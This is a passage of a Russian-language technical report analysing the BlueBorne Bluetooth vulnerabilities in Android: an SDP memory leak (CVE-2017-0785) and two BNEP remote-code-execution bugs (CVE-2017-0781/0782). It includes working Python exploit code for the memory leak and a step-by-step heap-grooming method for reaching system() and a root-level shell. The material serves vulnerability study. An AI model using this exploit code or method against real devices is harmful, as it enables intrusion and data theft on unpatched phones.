Данный фрагмент записывает копию поля **cont_offset** в объект *p_ccb* и проверяет, что полученное значение **cont_offset** равно текущему состоянию соединения. Поэтому простейшая подмена (как в случае с BlueZ) здесь не сработает. Но, каждый **continuation request**, вообще говоря это новый *SDP-запрос*, который имеет только **continuation state** в начале пакета. Поэтому обработчик может перепутать состояния **SDP-continuation**, если атакующая сторона начнет изменять параметры в последовательно идущих *SDP-запросах*. 
Значение *num_rsp_handles* вычисляется каждый раз, когда приходит *SDP-запрос*, основано на размере *SDP-ответа*. Размер ответа зависит от запрашиваемого клиентом Bluetooth сервиса. И, в противоположность **cont_offset**, его значение не сохраняется. Это может спровоцировать **переполнение** переменной *rem_handles*:
```c++
rem_handles = num_rsp_handles - cont_offset;
```
Далее предполагается, что *num_rsp_handles* и *cont_offset* ссылаются на один и тот же ответ, который разбит на фрагменты. Если обработчик перепутает состояния и так как *rem_handles* является  uint16_t, ответ обработчика сильно увеличится (вплоть до 64К) и последующий цикл for(...) скопирует данные, за границами *rsp_handles* в ответ клиенту.

Возможный сценарий атаки:
- Со стороны клиента формируется *SDP-запрос* на какой-то Bluetooth сервис.
- *SDP-ответ* сервера возвращается со структурой **continuation state**. Размер этого ответа определяется согласованным значением **MTU** соединения.
- Второй запрос формируется на другой сервис, но в его начало добавляется **continuation state** от полученного ответа. Если второй сервис сформирует меньший по размеру ответ, чем первый, это приведет к вышеописанной путанице состояний обработчика.
- Проверка **cont_offset** пройдет успешно, так как во второй запрос вставится то же значение **continuation state**.
- Так как *num_rsp_handles* от второго запроса меньше, чем от первого, достигнется **нижнее переполнение** *rem_handles*.
- Обработчик сформирует очень большой по размеру ответ и цикл for(...) скопирует байты за границами *rsp_handles*.
- Атакующий пришлет новый *SDP-запрос* с новым полученным **cont_offset**, продолжая читать данные за границами *rsp_handles*.

Подобно случаю с BlueZ, данная уязвимость может раскрыть большую область данных атакуемого процесса. Данные могут включать ключи шифрования или указатели на важные области кода или данных, что может быть использовано для обхода **ASLR** (рандомизации адресного пространства).

### Эксплутация уязвимости CVE-2017-0785

Данный пример использования уязвимости аналогично предыдущему получает данные *Bluetooth* процесса за пределами выделенного буфера. Эксплойт удалось отладить и запустить для атаки на Samsung Galaxy S3 (Android 4.4.2). В результате я получил важные адреса shared библиотеки, исполняемой от имени root, то есть код, имеющий наивысшие привилегии в системе. Это может быть в далнейшем использовано для обхода **ASLR**.

Ниже приведена функция, которая будет в дальнейшем формировать пакеты *SDP ServiceSearchAttributeRequest* (в отличие от прошлого примера, здесь, следуя сценарию атаки, мы должны будем отправлять пакета на два различных сервиса, дающих разные по длине ответы для запутывания состояний обработчика).

```python
# формирует SDP ServiceSearchAttributeRequest в зависимости от нужного нам сервиса
# service - UUID сервиса, на который отправится запрос (имеет размер 2 байта)
def packet(service, continuation_state):
    pkt = b'\x02\x00\x00'
    # p16 - функция, упаковывающая int в слово
    # например 8 -> b'\x00\x08'
    pkt += p16(7 + len(continuation_state))
    pkt += b'\x35\x03\x19'
    pkt += p16(service)
    pkt += b'\x01\x00'
    if type(continuation_state) == str:
        continuation_state = continuation_state.encode()
    # добавляем continuation_state в конец пакета
    pkt += continuation_state
    return pkt
```

Как и в предыдущем примере установим **L2CAP** соединение и согласуем значение **MTU**:
```python
mtu = 50
sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
bluetooth.set_l2cap_mtu(sock, mtu)
context.endian = 'big'
# установим соединение
sock.connect((target, 1))
```

Отправим первый *SDP-пакет* на сервис, дающий более длинный ответ:
```python
service_long = 0x0100 # UUID L2CAP сервиса
sock.send(packet(service_long, '\x00'))
data = sock.recv(mtu)
```

```python
stack = ''
service_short = 0x0001 # UUID SDP сервиса
for i in range(1, 30):
    p.status('Sending packet %d' % i)
    # отправляем SDP-запрос на сервис, дающий более короткий ответ
    # последние 3 байта прошлого ответа (data[-3:]) - новый continuation state
    sock.send(packet(service_short, data[-3:]))
    # получаем новый ответ
    data = sock.recv(mtu)
    # записываем полезную информацию
    stack_add = data[9:-3]
    if type(stack_add) == bytes:
        stack_add = str(stack_add).strip('b\'')
    # сдвигаем смещение, чтобы продолжить чтение
    # за границами буфера
    stack += stack_add
sock.close()
```

Полученные данные хранятся в *stack*

На рисунке ниже видны адреса исполнительной части shared-библиотеки **bluetooth.default.so** в оперативной памяти девайса (21090 - процесс *Bluetooth*). Видно, что исполнительная часть (r-xp) находится в диапазоне адресов **77aae000-77bec000**

![](https://raw.githubusercontent.com/IgorKurylev/bluetooth-report/master/pics/2_2_1.jpg)

**Рисунок 2.2.1** адреса **bluetooth.default.so** и **libbluetooth_jni.so** в оперативной памяти

Полученный дамп памяти представлен на рисунке 2.2.2. Желтым выделена часть адресов из диапазона исполнительной части библиотеки **bluetooth.default.so**. 

![](https://raw.githubusercontent.com/IgorKurylev/bluetooth-report/master/pics/2_2_2%20%E2%80%94%20%D0%BA%D0%BE%D0%BF%D0%B8%D1%8F.jpg)

**Рисунок 2.2.2** полученные данные в результате утечки информации 

По полученным значениям можно определить базовые адреса shared-библиотек, исполняемых с наивысшими правами в системе (не только **bluetooth.default.so**, но и например **libc.so**). Если с помощью какой-нибудь **RCE** уязвимости подменить исполняемый код в этих областях памяти, атакующий получит полный контроль над девайсом.

### Выводы

Ошибки в реализациях механизмов фрагментации в различных протоколах Bluetooth дают большое пространство для возможных атак. Но самая главная ошибка на мой взляд - предоставление обработки таких структур данных, как **continuation-state** на усмотрение разработчиков. В результате для эксплуатации уязвимостей *SDP* протокола достаточно лишь знать **BD_ADDR** (**MAC**-адрес) устройства жертвы, что может быть легко получено с помощью устройств для перехвата Bluetooth трафика. Атакующая сторона может перехватывать важные данные, используемые при Bluetooth-аутентификации, либо вспомогательные адреса для осуществления обхода **ASLR** (рандомизации адресного пространства) и дальнейшего получения контроля над всей системой.

# 2.3 BNEP и RCE уязвимости Bluetooth стека Android (CVE-2017-0781 и CVE-2017-0782) 
--------------------------------------
### Обзор BNEP

Протокол **BNEP** предназначен для инкапсуляции пакетов (обычно **TCP/IP**) поверх Bluetooth соединения. Это позволяет раздавать сеть интернет через Bluetooth.

**BNEP** используется вышестоящим в иерархии Bluetooth профилем **PAN**. На рисунке 2.3.1 видно, как полезные данные **Ethernet** пакета (так как **TCP/IP** уже инкапсулированы в **Ethernet**) упаковываются в **BNEP** пакет.

![](https://raw.githubusercontent.com/IgorKurylev/bluetooth-report/master/pics/2_3_1.jpg)

**Рисунок 2.3.1** инкапсуляция данных **Ethernet** в **BNEP** пакет

Таким образом, **BNEP** по сути представляет адаптированную под Bluetooth версию **Ethernet**. Также **BNEP** поддерживает специальное **контрольное сообщение** для облегчения **PAN** соединения и обеспечения надежности соединения. Его формат представлен на рисунке 2.3.2

![](https://raw.githubusercontent.com/IgorKurylev/bluetooth-report/master/pics/2_3_2.jpg)

**Рисунок 2.3.2** формат контрольного сообщения **BNEP**

Для включения нескольких контрольных сообщений в пакет низлежащего **L2CAP** протокола, в заголовок **BNEP** может быть также добавлено **расширение**. Его структура представлена на рисунке 2.3.3

![](https://raw.githubusercontent.com/IgorKurylev/bluetooth-report/master/pics/2_3_3.jpg)

**Рисунок 2.3.3** формат расширения заголовка **BNEP**

В расширение выставляется бит **E**, который указывает на начало нового контрольного сообщения.

В Bluetooth стеке Android найдены две **RCE** уязвимости, основанные на неправильной обработке контрольных сообщений.

### Android RCE уязвимость №1 (CVE-2017-0781)

Данная уязвимость возникает из-за некорректного вызова функции **memcpy** в обработчике **BNEP** сообщения:
```c++
UINT8 *p = (UINT8 *)(p_buf + 1) + p_buf->offset;
...
type = *p++;
extension_present = type >> 7;
type &= 0x7f;
...
switch (type)
{
...
// если получили контрольное сообщение
case BNEP_FRAME_CONTROL:
    ctrl_type = *p;
    // обрабатываем контрольное сообщение
    p = bnep_process_control_packet (p_bcb, p, &rem_len, FALSE);
    // если следующие контрольные сообщения нужно
    // обработать в режиме CONNECTED, а текущее состояние IDLE
    if (ctrl_type == BNEP_SETUP_CONNECTION_REQUEST_MSG && p_bcb->con_state != BNEP_STATE_CONNECTED &&
extension_present && p && rem_len)
{
    // сохранение необработанного контрольного
    // сообщения до тех пор, пока
    // не произойдет аутентификация
    p_bcb->p_pending_data = (BT_HDR *)osi_malloc(rem_len);
    memcpy((UINT8 *)(p_bcb->p_pending_data + 1), p, rem_len);
    ...
}
...
```
Выдержка из исходного кода функции **bnep_data_ind** в стеке Bluedroid

Фрагмент исходного кода, приведенный выше, отражает процесс обработки приходящих контрольных сообщений. *BNEP_FRAME_CONTROL* - тип контрольного сообщения. Приведенная ветка switch-case - попытка обработать следующую ситуацию: так как несколько контрольных сообщений могут содержаться в одном **L2CAP** пакете (используя бит **E**), состояние **BNEP** соединения может меняться в зависимости от каждого контрольного сообщения. Если, например, поле *SETUP_CONNECTION_REQUEST* выставлено в первом контрольном сообщении, следующие контрольные сообщения могут ожидать обработки в состоянии *CONNECTED* (не в начальном - *IDLE*). Но переключение в состояние *CONNECTED* требует процесса аутентификации. Так как этот процесс происходит асинхронно, возможна ситуация, что обработка контрольных сообщений все еще будет происходить в состоянии *IDLE*. Решение этой проблемы состоит в том, чтобы обрабатывать контрольные сообщения позже, когда уже гарантированно переключились в состояние *CONNECTED*.

Поэтому обработчик сохраняет оставшееся необработанное сообщение для использования в дальнейшем (в *p_pending_data*). Здесь и возникает ошибка. Сначала память для буфера *p_pending_data* (размер - *rem_len*) выделена в куче. Затем в участок памяти по адресу *p_pending_data* **+ 1** копируется сообщение размером *rem_len*. Поэтому каждый раз **memcpy** будет переполнять буфер на sizeof(*p_pending_data*) байтов. Вдобавок к этому, буфер *p_pending_data* еще и никогда не освобождается. Поэтому существует вероятность обращения к недоступной процессу памяти (**SIGSEGV**). Вполне вероятно, этот участок кода никогда не используется в реальных условиях.

Поле *p_pending_data* имеет размер 8 байтов. Переменная, *rem_len*, контролирующая размер выделенной памяти, находится под влиянием атакующей стороны, так как это длина оставшихся необработанных байтов пакета, а переменная *p*, так как указывает на отправленный атакующим пакет.

Возможна ситуация переполнения буфера, с помощью специально подготовленного для этого пакета. Его формат показан на рисунке 2.3.4

![](https://raw.githubusercontent.com/IgorKurylev/bluetooth-report/master/pics/2_3_4.png)

**Рисунок 2.3.4** формат специального пакета для переполнения буфера

Поле *type* состоит из установленного бита **E** и типа *BNEP_FRAME_CONTROL* (0x01) => (0x81). Поле *ctrl_type* установлено в *BNEP_SETUP_CONNECTION_REQUEST_MSG* (0x01) для воспроизведения вышеописанной ситуации и вызова **memcpy**. Overflow payload отвечает как раз за само переполнение. Также, так как возможно сформировать пакет любой длины, атакующая сторона может контролировать размер выделенной с помощью **osi_malloc** памяти, так как *rem_len*, как было показано выше, находится под влиянием атакующего.

### Эксплутация RCE уязвимости CVE-2017-0781

В этом разделе вместо исходного кода эксплойта будет разобрано, как исследователи нашли вариант использования данной уязвимости. Данный эксплойт будет пытаться запустить управляемую shell-оболочку на атакуемом девайсе. При исследовании уязвимости разработчиками был выбран девайс с Android 7.1.2

Неважно, какой разрядности будет атакуемое устройство, так как процесс Bluetooth является 32-битным, соответственно использует 32 битное адресное пространство.

Процесс исследования эксплуатации состоит из следующих шагов:
- Найти участок кода, в который будет легко попасть атакующеей стороной и который будет выделять память под буфер с указателем на некоторую функцию
- Найти участок кода, который будет записывать контролируемые атакующим полезные данные в определенную область памяти, имеющую некий абсолютный адрес (пока **ASLR** в расчет не берется)
- Найти способ повлиять на кучу (heap). В данном случае необходимо, чтобы память под *p_pending_data* была выделена прямо перед буфером из первого шага  
- Воспользоваться SDP уязвимостью утечки памяти для обхода **ASLR** и нахождения базовых адресов исполняемой части библиотеки bluetooth.default.so и **bss** секции libc.so

##### Выбор объекта, в который будут записываться полезные данные
----------------------------------------------------------------
Сначала попробуем послать много специальных пакетов (структура была показана на рисунке 2.3.4), так как данная уязвимость, как было показано в предыдущем разделе, всегда формирует **SIGSEGV** (обращение к памяти, к которой процесс доступа не имеет), демон Bluetooth экстренно завершает свою работу после получения большого количества специальных пакетов. В случае с используемым устройством, это были 500-1000 пакетов. Пакеты посылались через **L2CAP** соединение на **PSM** (идентификатор сервиса) с номером 15, то есть сервису **BNEP**. На рисунке 2.3.4 показаны логи, выводимые устройством-жертвой в результате атаки.

![](https://raw.githubusercontent.com/IgorKurylev/bluetooth-report/master/pics/2_3_5.png)

**Рисунок 2.3.5** выдержка из логов атакуемого устройства

На рисунке 2.3.6 показано место в отладчике, где возникает **SIGSEGV**.

![](https://raw.githubusercontent.com/IgorKurylev/bluetooth-report/master/pics/2_3_6.jpg)

**Рисунок 2.3.6** выдержка анализируемого процесса из отладчика (ассемблер **ARM**)

Как видно из отладчика, это место находится в функции **btu_hci_msg_process**.

```c++
// можно сказать, что p_msg - указатель
// на переданную дейтаграмму
static void btu_hci_msg_process(BT_HDR *p_msg) {
    // определяем тип полученного сообщения
    switch (p_msg->event & BT_EVT_MASK)
    {
        case BTU_POST_TO_TASK_NO_GOOD_HORRIBLE_HACK: 
        ((post_to_task_hack_t *)(&p_msg->data[0]))->callback(p_msg);
        break;
...
```
Исходный код функции *btu_hci_msg_process*

Аварийное завершение процесса возникает при обращении к *p_msg->event* (оно же - первая красная строка на рисунке 2.3.6, в регистре R4 - адрес *p_msg*). Поле **event**- первое в структуре **BT_HDR**, то есть в структуре буфера данных Bluetooth пакета. Следовательно, атакующий получает контроль над указателем *p_msg* в данной ситуации, как видно из логов, где в регистре R4 хранится значение *0x41414141*.

Рассмотрим тип события *BTU_POST_TO_TASK_NO_GOOD_HORRIBLE_HACK* (*0x1700* в отладчике - зеленое поле на рисунке 2.3.6). По всей видимости, для этого типа события первые байты поля **data** (смещение 8 в *p_msg*) - указатель на функцию, которая вызывается с параметром *p_msg* (будет показано далее).

Также заметим, что в логах в стеке хранится адрес следующей функции:
```c++
void btu_task_start_up(void *context) {
...
    fixed_queue_register_dequeue(btu_hci_msg_queue, thread_get_reactor(bt_workqueue_thread), btu_hci_msg_ready, NULL);
...
}
```
Функция, регистрирующая *btu_hci_msg_queue*

```c++
void btu_hci_msg_ready(fixed_queue_t *queue, void *context) {
    BT_HDR *p_msg = (BT_HDR *)fixed_queue_dequeue(queue);
    btu_hci_msg_process(p_msg);
}
```
Обработчик приходящих сообщений *hci msgs* в **btu_hci_msg_queue**

Функция **btu_hci_msg_ready** регистрирует **btu_hci_msg_process** как обработчик для любых сообщений, приходящих в *btu_hci_msg_queue*. В эту очередь приходят все сообщения от Bluetooth-контроллера через низкоуровневый протокол **HCI**. Поэтому все пакеты атакующего будут упорядочены. "Horrible hack" в функции **btu_hci_msg_process**, показанной выше - резервирование этой очереди для разных типов сообщений, имеющих callback (функцию-отклик на некоторое событие).

Исследуя исходный код далее, приходим к непосредственному месту, в котором возникнет переполнение (и далее - **SIGSEGV**):
```c++
void *fixed_queue_dequeue(fixed_queue_t *queue) {
    ...
    void *ret = list_front(queue->list);
    list_remove(queue->list, ret);
    ...
    return ret;
}
```
Переполнение выделенного буфера

Поле **list** представляет собой связный список **list_node_t**, приведенный ниже:
```c++
struct list_node_t {
    struct list_node_t *next;
    void *data;
};
```
Определение структуры **list_node_t**

Память в месте, где обнаружена уязвимость, выделяется через функцию **osi_malloc**, используемой оберткой **jemalloc** от Android. Эта функция размещает одинаковые по длине блоки в непрерывно идущие области памяти. Так как *p_pending_data*, который мы собираемся перезаписывать, имеет длину 8 байтов, как и объект **list_node_t**, очень вероятно, что они размещены в памяти последовательно.

В ситуации с аварийным завершением Bluetooth-процесса, **list_node_t** был перезаписан со значением *0x41414141*. Затем его поле **data** преобразуется к типу **BT_HDR** (переменная *p_msg*) и передается в обработчик **btu_hci_msg_process**.

Дальнейший анализ показал, что где-то в 80% случаев завершения процесса переполнение было вызвано записью в объект **list_node_t**.

Таким образом, чтобы эксплуатировать переполнение, нам нужно множество объектов **list_node_t** со свободными промежутками между ними, чтобы повысить шансы, что память под *p_pending_data* будет выделена рядом с узлом связанного списка, что достигается отправлением большого количества специальных пакетов. Каждый из пакетов попадает в функцию **btu_hci_msg_queue** как объект узла списка и в дальнейшем будет обработан функцией, где обнаружена уязвимость.

Эксплойту требуется знать адрес в памяти, который будет содержать полезные данные до переполнения. Этот адрес будет записан в поле **data** узла списка, используя 8-байтное переполнение, описанное выше. По этому адресу будут записаны байты, приведенные на рисунке ниже.

![](https://raw.githubusercontent.com/IgorKurylev/bluetooth-report/master/pics/2_3_7.png)
**Рисунок 2.3.7** адрес, содержащий дополнительные данные для эксплойта

Также будут записаны адрес **libc_system** (функция **system()**, выполняющая переданные ей команды оболочки) в поле адреса функции-отклика (callback) на событие *0x2217414141414141* и дополнительные bash-команды. При удачной атаке, данные должны интерпретироваться, как вызов **system()** со следующими аргументами: 

![](https://raw.githubusercontent.com/IgorKurylev/bluetooth-report/master/pics/2_3_8.png)

**Рисунок 2.3.8** аргументы, переданные **system()**

#### Запись полезных данных в память
------------------------------------------

Данные на рисунке 2.3.7 должны быть помещены в определенную область памяти. Анализ исходного кода  стека Bluedroid показывает, что многие структуры данных, связанные с активными Bluetooth соединениями расположены в неких глобальных структурах. Это означает, что они расположены в секциях **bss** и данных. Смещения в секции **bss** - константы времени компиляции программы. Единственный неопределенный заранее параметр (из-за **ASLR**), влияющий на такие смещения - базовые адреса исполнительных секций. Рисунок 2.3.9 показывает, как относительно друг друга расположены секции **bss** и данных.  

![](https://raw.githubusercontent.com/IgorKurylev/bluetooth-report/master/pics/2_3_9.jpg)

**Рисунок 2.3.9** типичная структура памяти программы

В этих секциях располагаются такие данные, как например имя Bluetooth устройства, которые могут изменяться, как показано на рисунке 2.3.10

![](https://raw.githubusercontent.com/IgorKurylev/bluetooth-report/master/pics/2_3_10.jpg)

**Рисунок 2.3.10** изменение имени Bluetooth устройства

Этим именем устройства обмениваются через низлежащий относительно **L2CAP** протокол **ACL**. Спецификация имени устройства представлена на рисунке 2.3.11

![](https://raw.githubusercontent.com/IgorKurylev/bluetooth-report/master/pics/2_3_11_1.jpg)
![](https://raw.githubusercontent.com/IgorKurylev/bluetooth-report/master/pics/2_3_11_2.jpg)

**Рисунок 2.3.11** выдержка из документации Bluetooth

Структуры данных, содержащие имя Bluetooth устройства:

```c++
typedef struct
{
    ...
    tACL_CONN acl_db[MAX_L2CAP_LINKS];
    ...
} tBTM_CB;

typedef struct
{
    ...
    BD_NAME remote_name;
    ...
} tACL_CONN;
```

Структура **tBTM_CB** расположена в секции **bss** процесса Bluetooth. Следовательно имеет заранее определенное смещение. По аналогии, остальные данные, используемые Bluetooth соединением, тоже имеют независимый относительный адрес.

Как было показано на первом шаге, необходимо расположение данных в куче как показано на рисунке 2.3.12

![](https://raw.githubusercontent.com/IgorKurylev/bluetooth-report/master/pics/2_3_12.png)

**Рисунок 2.3.12** нужное расположение данных в куче

Видно, что 8-байтный буфер с полезной информацией находится прямо перед узлом связанного списка. Но если просто посылать пакеты жертвы, мы не достигнем нужного расположения. Что будет на самом деле в куче показано на рисунке 2.3.13 

![](https://raw.githubusercontent.com/IgorKurylev/bluetooth-report/master/pics/2_3_13.png)

**Рисунок 2.3.13** как данные в куче будут располагаться на самом деле

Когда пакеты придут на устройство жертвы, выделится память под узлы связанного списка. Затем они будут обрабатываться **bnep_data_ind** (функцией, в которой обнаружена уязвимость). Память под буферы *p_pending_data* будет выделена уже после узлов списка. Таким образом, при переполнении нужная для полезных данных область памяти (узлы) останется нетронутой из-за того, что перед узлами заранее не было выделенной памяти. Эти "дыры" в памяти могут образоваться только после освобождения памяти под узлы списка, но маловероятно, что каждая "дыра" будет образовываться перед каждым узлом. На рисунке 2.3.14 показано, как освобожденные области будут располагаться относительно узлов списка. 

![](https://raw.githubusercontent.com/IgorKurylev/bluetooth-report/master/pics/2_3_14drawio.png)

**Рисунок 2.3.14** как в куче будут располагаться освобожденные области

Существует способ, позволяющий расположить свободные места в памяти **между** необработанными узлами. Можно заставить **bnep_data_ind** (функцию, где найдена уязвимость) посылать в ответ атакующему множество ошибочных пакетов "Неизвестная команда", как показано в следующем фрагменте:
```c++
...
if (extension_present) {
    ...
    org_len = rem_len;
    new_len = 0;
    do {
        ext = *p++;
        length = *p++;
        p += length;
        if ((!(ext & 0x7F)) && (*p > BNEP_FILTER_MULTI_ADDR_RESPONSE_MSG))
            // посылается пакет "неизвестная команда"
            bnep_send_command_not_understood (p_bcb, *p);
        new_len += (length + 2);
        if (new_len > org_len)
            break;
    // то есть достаточно посылать пакеты
    // с расширением, начинающимся с 0x80
    } while (ext & 0x80);
}
...
```

Данная ситуация может возникнуть, если жертве прислать еще один специальный созданный пакет, представленный на рисунке 2.3.15

![](https://raw.githubusercontent.com/IgorKurylev/bluetooth-report/master/pics/2_3_15.png)

**Рисунок 2.3.15** формат специального пакета для создания ситуации, когда команда не распознана

Данный пакет проходит все проверки, чтобы достичь вышеприведенный цикл do {...} while(...). В его полезных данных хранится несколько 3-байтовых последовательностей *0x800109*, отвечающих за расширения. Тип расширения-*0x08*, длина- 1 байт, тип команды-*0x09* (несуществующая команда). На каждую такую последовательность будет отправлен пакет "Неизвестная команда". Ответный пакет от атакующего будет содержать в конце **xmit_q**:

```c++
...
fixed_queue_enqueue(p_bcb->xmit_q, p_buf);
...
```

Теперь можно отправлять такой специальный пакет до атаки пакетами, которые провоцируют переполнение. Они будут обработаны **bnep_data_ind** раньше и будет выделена дополнительно память под объекты, соответствующие **xmit_q**. Так как **xmit_q**-вне очереди и его узлы списка освобождаются в отдельном потоке, образующиеся "дыры" в памяти будут появляться случайным образом между необработанными узлами как показано на рисунке 2.3.16.

![](https://raw.githubusercontent.com/IgorKurylev/bluetooth-report/master/pics/2_3_16.png)

**Рисунок 2.3.16** как будут освобождаться **xmit_q**

Таким образом, когда **bnep_data_ind** обрабатывает пакет, провоцирующий переполнение (обработанный узел на рисунке 2.3.16), память под новый *p_pending_data* будет выделяться на месте освобожденного **xmit_q** узла. Последующее переполнение затронет необработанный **hci** узел. Затем выполнится функция **system()** с переданными ей аргументами и запустит shell-оболочку. Атака произойдет успешно.

#### Пост-эксплуатация
-------------------------------------------------

Показанный на рисунке 2.3.17 вывод команды **id** говорит о том, что оболочка запущена от имени процесса *com.android.bluetooth*. Это наиболее высокие права в системе Android. Данный процесс имеет полный доступ к файловой системе, получает полный контроль над сетевым стеком и Bluetooth стеком. Последние права дают возможность распространить атаку с устройства жертвы на девайсы вокруг него.

![](https://raw.githubusercontent.com/IgorKurylev/bluetooth-report/master/pics/2_3_17.jpg)

**Рисунок 2.3.17** вывод команды **id** интерактивной оболочки

### Android RCE уязвимость №2 (CVE-2017-0782)

Вторая уязвимость возникает в функции **bnep_process_control_packet**, вызываемой **bnep_data_ind**. Она заключется в переполнении целочисленной переменной *rem_len*:
```c++
...
if (is_ext)
{
    ext_len = *p++;
    *rem_len = *rem_len - 1;
}
...
control_type = *p++;
*rem_len = *rem_len - 1;
...
switch (control_type)
{
    ...
    // если тип контрольного сообщения неизвестен
    default :
    ...
    if (is_ext)
    {
        p += (ext_len - 1);
        // просто игнорируем неопознанное сообщение 
        *rem_len -= (ext_len - 1); // переполнение возникает здесь
    }
    break;
}
...
```
Фрагмент исходного кода функции-обработчика контрольных пакетов *bnep_process_control_packet*

Данная функция учитывает все контрольные сообщения протокола **BNEP** и заголовки расширений, чтобы обработать вложенные сообщения. Документация **BNEP** позволяет игнорировать неопознанные типы расширений, что показано в ветке default вышеприведеннного фрагмента исходного кода, смещая указатель на длину расширения.

Переменная *rem_len* имеет тип 16-битного unsigned short и равна величине оставшихся необработанных байтов полученного пакета. *ext_len* - 8-битный unsigned и является частью заголовка расширения, который также контролируется атакующей стороной. Таким образом, *rem_len* может быть переполнен до любого значения больше *0xff00*, дальнейшая обработка пакета будет небезопасной, так как зависит от *rem_len*.  

Например, если *rem_len* равна *10* и атакующая сторона устанавливает *rem_len* в *12*, значение *rem_len* будет:
```c++
rem_len -= (12 - 1) ⇔ rem_len -= 11 ⇔ rem_len == 10 - 11 == 0xffff
```
В функции **bnep_data_ind** после вызова **bnep_process_control_packet**:
```c++
...
while (extension_present && p && rem_len)
{
    ext_type = *p;
    extension_present = ext_type >> 7;
    ext_type &= 0x7F;
    // если расширение неизвестно, останавливаем обработку сообщения
    if (ext_type)
    {
        ...
        break;
    }
    p++;
    rem_len--;
    p = bnep_process_control_packet (p_bcb, p, &rem_len, TRUE);
}

// rem_len попадает с переполнением
p_buf->offset += p_buf->len - rem_len;
p_buf->len = rem_len;
...
// bnep_cb.p_data_ind_cb - указатель на функцию, реагирующую на события вышестоящих уровней
else if (bnep_cb.p_data_ind_cb)
{
    (*bnep_cb.p_data_ind_cb)(p_bcb->handle, p_src_addr, p_dst_addr,
protocol, p, rem_len, fw_ext_present);
    osi_free(p_buf);
}
```
Фрагмент исходного кода функции **bnep_data_ind**

Переменная *rem_len*, которая уже была переполнена на предыдущем этапе, устанавливается в качестве значения полей **len** и **offset** (смещение первого необработанного байта в пакете) структуры *p_buf* (структура самого пакета). Вместе эти поля определяют сколько байтов осталось обработать для протоколов вышестоящих уровней. Итак, так как *rem_len* равно -1 и предположим, что *p_buf->len* равно 15, смещение будет следующим:
```c++
p_buf->offset += (15 - 0xffff) ⇔ p_buf->offset += 16
```
Теперь, так как смещение мало, а длина большая, любой вышестоящий протокол сталкивается с увеличенным количеством полезных данных пакета. Таким образом, атакующая сторона может обойти любые ограничения на **MTU** пакета. 

Далее в функцию по адресу *bnep_cb.p_data_ind_cb* передается неправильный *p_buf*. Следовательно, возможно достичь следующего участка кода:
```c++
static void bta_pan_data_buf_ind_cback(
    uint16_t handle, const RawAddress& src, const RawAddress& dst,
    uint16_t protocol, BT_HDR* p_buf, bool ext, bool forward)
{
...
    BT_HDR* p_new_buf;
    if (sizeof(tBTA_PAN_DATA_PARAMS) > p_buf->offset) {
        // смещение меньше, чем структура данных перед самими данными
        //malloc выделит 4096 байтов
        p_new_buf = (BT_HDR*)osi_malloc(PAN_BUF_SIZE);
        // здесь возникнет переполнение
        memcpy((uint8_t*)(p_new_buf + 1) +  sizeof(tBTA_PAN_DATA_PARAMS), (uint8_t*)(p_buf + 1) + p_buf->offset, p_buf->len);
    ...
        osi_free(p_buf);
    }
...    
}
```

В этой функции нет правильных проверок на смещение и длину. Проверяется только, что смещению меньше, чем *sizeof(tBTA_PAN_DATA_PARAMS)* (равно 24), что легко обойти. **osi_malloc** выделяет под буфер *p_new_buf* участок памяти размером *PAN_BUF_SIZE* (равно 4096) и **memcpy** копирует в эту область *p_buf->len* байтов, что было установлено ранее в *0xffff*. В куче возникает переполнение размером *0xf000* байтов.

Чтобы воссоздать ситуацию, когда возникает уязвимость, нужно чтобы **BNEP** соединение было в состоянии *BNEP_STATE_CONNECTED*. Поэтому нужно послать запрос типа *BNEP_SETUP_CONNECTION_REQUEST_MSG*. После того, как это состояние достигнуто, нужно послать специальный пакет, формат которого приведен на рисунке 2.3.18

![](https://raw.githubusercontent.com/IgorKurylev/bluetooth-report/master/pics/2_3_18.png)

**Рисунок 2.3.18** формат специального пакета

Поле типа-*BNEP_FRAME_COMPRESSED_ETHERNET* с установленным флагом *extension_present* (старший бит). Из-за флага вызовется уязвимая функция **bnep_process_control_packet**, далее возникнет переполнение *rem_len* (как было показано ранее). Поле **control_type** установлено в *0x10*, чтобы достичь ветки default в функции **bnep_process_control_packet**. После этого переполненное значение *rem_len* скопируется в *pbuf->len* и затронет *pbuf->offset*. В конце пакет передастся в функцию по адресу *p_data_ind_cb*, вызывающую *bta_pan_data_buf_ind_cback*, возникнет переполнение в куче.

Пример эксплуатации я не стал приводить, так как в целом идеи те же, что и с прошлой уязвимостью.

### Выводы

Хоть уязвимости и эксплуатируются в пространстве пользователя, в отличие от **RCE** в BlueZ, где вредоносный код исполняется в пространстве ядра, успешная атака все равно гарантирует вредоносному коду наивысшие права в системе (от имени root-пользователя). Также пост-эксплуатация обеих уязвимости будет гораздо проще, так как не придется вызывать код пространства пользователя из пространства ядра.

Обе Android **RCE** уязвимости должны использоваться вместе с *SDP* утечкой данных, чтобы обойти **ASLR** (рандомизацию адесного пространства) либо с любой другой подобной, так как требуется получить базовые адреса некоторых shared-библиотек.

Вместе с **SDP** уязвимостью обе **RCE** уязвимости могут создать надежный саморазмножающийся эксплойт, с такими правами, как доступ к файловой системе, полный контроль над сетевым стеком и Bluetooth стеком. 

Данные уязвимости показывают, что из-за (иногда неоправданной) сложности используемых протоколов, Bluetooth устройства становятся очень уязвимыми к атакам, использующим ошибки в реализациях этих протоколов. Закрытие ошибок реализаций не решит всех проблем, так как существует еще много подобных недостатков в спецификациях Bluetooth.

# Заключение
------------------

Даже на момент написания доклада миллионы устройств, поддерживающих Bluetooth, остаются уязвимы. Многие все еще используют уязвимые устройства. На рисунке 3.1.1 показано, что еще на протяжении нескольких лет множество устройств с Android и Linux будут подвержены уязвимостям.

![](https://raw.githubusercontent.com/IgorKurylev/bluetooth-report/master/pics/1_0_1.png)

**Рисунок 3.1.1** проноз количества уязвимых устройств 
Хоть и патчи с исправлениями вышли еще в 2017 году, на сегодняшний день уязвимы:
- 768 миллионов устройств c Linux
- 734 миллиона устройств с Android 5.1 и более ранних версий
- 261 миллион устройств с Android 6 и более ранних версий
- 200 миллионов устройств с Windows
- 50 миллионов устройств с IOS 9.3.5 и более ранних версий

Такое количество объясняется тем, что для многих устройств (например медицинское или промышленное оборудование) получать обновления безопасности проблематично. К тому же для некоторых неподдерживаемых устройств такие обновления уже не выходят.

После заявления исследователей о Blueborne в 2017 году и до момента написания доклада нашелся еще целый ряд Bluetooth уязвимостей:

- Март 2018 - исследователи раскрыли ряд критических **RCE** уязвимостей Android (CVE-2017-13160, CVE-2017-13255, CVE-2017-13256, CVE-2017-13272, CVE-2017-13266). Все устройства до версии 8 подвержены данным уязвимостям.
